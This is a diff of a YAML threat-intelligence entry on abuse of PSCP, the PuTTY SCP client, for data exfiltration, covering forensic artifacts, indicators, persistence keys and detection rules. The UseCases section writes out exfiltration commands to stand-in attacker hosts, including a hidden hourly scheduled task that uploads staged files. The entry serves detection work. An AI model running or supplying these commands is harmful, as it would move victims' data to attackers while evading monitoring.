@@ -1,11 +1,11 @@
 Name: PSCP
-Description: |
+Description: >
   PSCP (PuTTY Secure Copy) is a lightweight command-line SCP client from the PuTTY suite
-  used to copy files securely over SSH. Because it is a single, portable executable that
-  supports encrypted transfers and common SSH authentication methods, adversaries frequently
-  reuse PSCP to exfiltrate data to attacker-controlled SSH servers. PSCP's ubiquity, lack
-  of installation requirement, and straightforward command-line usage make it attractive
-  for stealthy, scriptable exfiltration workflows.
+  used to copy files securely over SSH. Because it is distributed as a portable executable
+  and supports encrypted, non-interactive transfers, threat actors frequently abuse PSCP
+  to exfiltrate data to attacker-controlled SSH servers. Its lack of installation
+  requirements and simple command-line syntax make it well suited for scripted and
+  stealthy exfiltration workflows.
 Category: third-party
 Platform:
   - Windows
@@ -13,95 +13,97 @@ Platform:
 Execution:
   - cli
 Capabilities:
-  - secure-file-transfer      # encrypted transfer using SSH/SCP
-  - non-interactive-usage     # supports key-based auth and scripted invocation
-  - recursive-transfer       # recursive copy of directories (e.g., -r)
-  - custom-port              # ability to use non-standard SSH ports
-  - quiet-mode               # suppress verbose output for stealth
-Stealth:
-  - portable-executable      # single-file binary runnable from any path
-  - key-based-authentication # avoid interactive password prompts
-  - non-standard-port        # use of non-22 ports to evade simple filters
-  - run-from-user-paths      # execution from %TEMP% or %APPDATA% to blend in
+  - secure-file-transfer      # Encrypted file transfer over SSH/SCP.
+  - non-interactive-usage     # Supports key-based authentication and scripted execution.
+  - recursive-transfer       # Recursive upload of entire directory trees (-r).
+  - custom-port               # Allows use of non-standard SSH ports (-P).
+  - quiet-execution           # Minimal or suppressed output during transfers.
+  - portable-execution        # Single binary executable runnable from arbitrary paths.
 Forensics:
   BinaryLocations:
-    - 'C:\Program Files\PuTTY\pscp.exe'
-    - 'C:\Windows\System32\pscp.exe'
-    - '/usr/bin/pscp'
-    - '/usr/local/bin/pscp'
-    - '%USERPROFILE%\AppData\Local\Temp\pscp.exe'
+    - C:\Program Files\PuTTY\pscp.exe
+    - C:\Windows\System32\pscp.exe
+    - USERPROFILE\AppData\Local\Temp\pscp.exe
+    - /usr/bin/pscp
+    - /usr/local/bin/pscp
   FileNamePatterns:
     - pscp.exe
     - pscp32.exe
     - pscp64.exe
   CommandLineArgs:
-    - '-r'                     # recursive copy of directories
-    - '-P'                     # custom SSH port (e.g., -P 2222)
-    - '-pw'                    # password on command line (suspicious)
-    - '-i'                     # private key file for key-based auth
-    - '-scp'                   # enforce scp protocol (when applicable)
+    Description: Command-line options commonly observed in PSCP-based data exfiltration.
+    Indicators:
+      - -r                     # Recursive copy of directories.
+      - -P                     # Custom SSH port (e.g., -P 2222).
+      - -pw                    # Password supplied on command line (high-risk).
+      - -i                     # Private key file for non-interactive authentication.
+      - user@host:path         # SCP-style remote destination syntax.
   ConfigFiles:
-    - '%USERPROFILE%\.ssh\id_rsa'            # common private key used to authenticate
-    - '%USERPROFILE%\.ssh\known_hosts'       # SSH known hosts entries to obscure destinations
-    - '~/.ssh/id_rsa'
-    - '~/.ssh/known_hosts'
+    - USERPROFILE\.ssh\id_rsa
+    - USERPROFILE\.ssh\known_hosts
+    - ~/.ssh/id_rsa
+    - ~/.ssh/known_hosts
+  RegistryPersistence:
+    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\pscp_updater
+    - HKLM\Software\Microsoft\Windows\CurrentVersion\Run\pscp_service
+  LogFiles:
+    - TEMP\pscp-transfer.log
+    - C:\Users\<user>\pscp.log
+  NetworkArtifacts:
+    Description: >
+      PSCP generates outbound SSH connections to remote hosts defined on the command line.
+      Network indicators alone are insufficient without endpoint context.
   ScheduledTask:
     - Name: PSCP_Exfil_Task
-      Description: Scheduled task used to run PSCP periodically to upload collected archives.
-      Command: 'powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\run_pscp.ps1'
+      Description: Scheduled task used to periodically upload collected files using PSCP.
+      Command: powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\run_pscp.ps1
     - Name: SystemMaintenance
-      Description: Masqueraded scheduled task that runs an exfiltration script using PSCP.
-      Command: 'schtasks /run /tn "SystemMaintenance"'
-  RegistryPersistence:
-    - 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\pscp_updater'
-    - 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run\pscp_service'
-  LogFiles:
-    - 'C:\Users\<user>\pscp.log'
-    - '%TEMP%\pscp-transfer.log'
-  NetworkArtifacts:
-    - 'Outbound SSH sessions to uncommon IPs or ports (tcp/22 or custom port)'
-    - 'One-off or short-lived SSH connections immediately following archive creation'
-    - 'High bytes_out associated with scp sessions'
+      Description: Masqueraded task invoking PSCP-based exfiltration.
+      Command: schtasks /run /tn "SystemMaintenance"
+NetworkBehavior:
+  Description: >
+    PSCP-based exfiltration is characterized by short-lived SSH connections initiated
+    directly by a file transfer utility, often immediately after file staging or archive
+    creation. Transfers are typically one-directional and may use non-standard ports or
+    key-based authentication to reduce visibility.
+  Behaviors:
+    - Outbound SSH connections initiated by pscp.exe
+    - Use of non-standard SSH ports for file transfer
+    - High bytes_out with little or no inbound data
+    - Execution from user-writable directories such as TEMP or APPDATA
+    - File transfer activity following archive or staging operations
 ThreatActors:
   - ransomware
-References:
-  - 'https://www.trendmicro.com/en_us/research/23/f/malvertising-used-as-entry-vector-for-blackcat-actors-also-lever.html'
-  - 'https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/'
-  - 'https://the.earth.li/~sgtatham/putty/latest/htmldoc/Chapter5.html'  # PuTTY / PSCP docs
 UseCases:
   - Title: Simple file upload to attacker SSH server
-    Description: Upload a single file to a remote SSH server using username@host:path.
+    Description: Upload a single file to a remote SSH server.
     Command: |
       pscp.exe C:\Staged\secret.zip attacker@1.2.3.4:/home/attacker/exfil/secret.zip
   - Title: Recursive directory upload
-    Description: Recursively copy an entire folder to a remote host (useful for bulk exfiltration).
+    Description: Recursively upload an entire directory for bulk exfiltration.
     Command: |
       pscp.exe -r C:\Staged\Data attacker@1.2.3.4:/home/attacker/exfil/data
-  - Title: Non-standard port and key-based auth (scripted)
-    Description: Use a private key and a custom SSH port to avoid standard-port detection.
+  - Title: Key-based authentication on custom port
+    Description: Use SSH key authentication and a non-standard port for stealth.
     Command: |
       pscp.exe -i C:\Users\Public\id_rsa -P 2222 C:\Staged\*.zip attacker@sshhost.example:/incoming/
-  - Title: Silent execution via PowerShell scheduled task
-    Description: Task executes PSCP to transfer files, then optionally cleans up local artifacts.
+  - Title: Scheduled silent exfiltration
+    Description: PSCP executed via scheduled task to automate uploads and cleanup.
     Command: |
-      schtasks /Create /SC HOURLY /TN "SystemMaintenance" /TR "powershell -WindowStyle Hidden -Command 'Start-Process -FilePath C:\Temp\pscp.exe -ArgumentList ''-r C:\Staged attacker@1.2.3.4:/exfil'' -NoNewWindow -Wait; Remove-Item C:\Staged\* -Force'"
+      schtasks /Create /SC HOURLY /TN "SystemMaintenance" /TR "powershell -WindowStyle Hidden -Command 'Start-Process C:\Temp\pscp.exe -ArgumentList ''-r C:\Staged attacker@1.2.3.4:/exfil'' -Wait'"
 Detection:
-  - Type: Process/Path Anomaly
-    Description: Alert on pscp.exe (or suspiciously named pscp-like binaries) executed from non-standard locations (e.g., %TEMP%, %APPDATA%, user Desktop) or when the binary name is unusual for the host.
-  - Type: Command-Line Pattern
-    Description: Detect use of recursive (-r), custom port (-P), key-based (-i) or password-on-cmdline (-pw) flags combined with remote host destinations and large byte transfer.
-  - Type: Parent/Launcher Anomaly
-    Description: Flag pscp.exe started by non-interactive parents (e.g., wscript/cscript, mshta, scheduled task, or unknown service) or launched by interpreters (powershell.exe/cmd.exe) in suspicious contexts.
-  - Type: Network Correlation
-    Description: Correlate process creation with outbound SSH connections to IPs that are rare or never-before-seen for the environment (including use of non-22 ports).
-  - Type: Data Volume
-    Description: Alert when pscp-related process exhibits large bytes_out shortly after file-collection/archival activity (.zip/.7z creation).
-  - Type: Persistence & Hygiene
-    Description: Detect creation of scheduled tasks or Run keys that reference pscp or scripts invoking pscp, and file cleanup immediately after successful transfers.
-Tags:
-  - stealth
-  - third-party
-  - cli
-  - secure-transfer
-  - commonly-used
-LastModified: '2025-11-17'
+  - Type: Process Path Anomaly
+    Description: Detect pscp.exe execution from non-standard or user-writable directories.
+  - Type: Command-Line Abuse
+    Description: Alert on PSCP usage with -r, -P, -i, or -pw flags combined with remote destinations.
+  - Type: Parent Process Anomaly
+    Description: Flag PSCP launched by scheduled tasks, scripts, or uncommon parent processes.
+  - Type: SSH Exfiltration Correlation
+    Description: Correlate PSCP execution with outbound SSH connections to rare or first-seen IPs or ports.
+  - Type: Data Volume Anomaly
+    Description: Detect large outbound data transfers associated with PSCP following file staging or archive creation.
+References:
+  - https://www.trendmicro.com/en_us/research/23/f/malvertising-used-as-entry-vector-for-blackcat-actors-also-lever.html
+  - https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/
+  - https://the.earth.li/~sgtatham/putty/latest/htmldoc/Chapter5.html
+LastModified: '2025-12-12'
